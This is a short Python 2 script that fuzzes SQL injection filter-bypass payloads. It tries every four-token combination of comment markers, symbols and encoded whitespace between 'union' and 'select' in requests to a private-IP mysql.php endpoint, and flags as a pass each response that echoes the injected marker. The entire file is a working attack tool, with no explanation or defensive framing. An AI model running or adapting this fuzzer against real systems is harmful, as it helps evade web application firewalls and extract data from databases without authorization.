import itertools
import requests

def do_get(url):
	try:
		resp = requests.get(url)

		if 'ABCD' in resp.text:
			print '[PASS]', url
		elif 0:
			print '[FAIL]', url
	except Exception as e:
		print e
		pass

words = ['/*!','*/','/**/','/','?','~','!','.','%','-','*','+','=', '%0a','%0b','%0c','%0d','%0e','%0f','%0h','%0i','%0j']

for parts in itertools.product(words, repeat = 4):
	url = 'http://172.16.177.120/mysql.php?id=-1/*!union{}select*/1,0x41424344'.format(''.join(parts))
	# url = 'http://127.0.0.1:8080/mysql/?id=1/*!union{}select*/1,0x41424344'.format(''.join(parts))
	do_get(url)